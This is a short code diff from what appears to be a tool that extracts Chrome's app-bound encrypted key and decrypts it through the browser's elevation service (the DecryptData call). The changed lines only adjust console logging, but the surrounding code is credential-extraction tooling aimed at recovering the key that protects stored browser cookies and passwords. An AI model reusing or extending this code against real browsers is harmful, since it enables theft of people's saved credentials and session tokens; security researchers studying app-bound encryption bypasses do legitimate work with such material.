@@ -446,7 +446,9 @@ int main(int argc, char *argv[])
     ConsoleUtils::SetConsoleColor(9);
     std::cout << "[+] ";
     ConsoleUtils::SetConsoleColor(7);
-    std::cout << "Encrypted key retrieved: " << ChromeAppBound::BytesToHexString(encrypted_key.data()) << "..." << std::endl;
+    std::cout << "[+] Encrypted key retrieved: " 
+          << ChromeAppBound::BytesToHexString(encrypted_key.data(), encrypted_key.size()) 
+          << std::endl;
 
     BSTR ciphertext_data = SysAllocStringByteLen(reinterpret_cast<const char *>(encrypted_key.data()), encrypted_key.size());
     if (!ciphertext_data)
@@ -463,7 +465,9 @@ int main(int argc, char *argv[])
     std::cout << "[+] ";
     ConsoleUtils::SetConsoleColor(7);
     std::cout << "BSTR allocated for encrypted key." << std::endl;
-    std::cout << "ciphertext_data" << encrypted_key <<std::endl;
+    std::wcout << "[+] BSTR allocated for encrypted key: " 
+           << reinterpret_cast<wchar_t*>(ciphertext_data) 
+           << std::endl;
     BSTR plaintext_data = nullptr;
     DWORD last_error = ERROR_GEN_FAILURE;
     hr = elevator->DecryptData(ciphertext_data, &plaintext_data, &last_error);
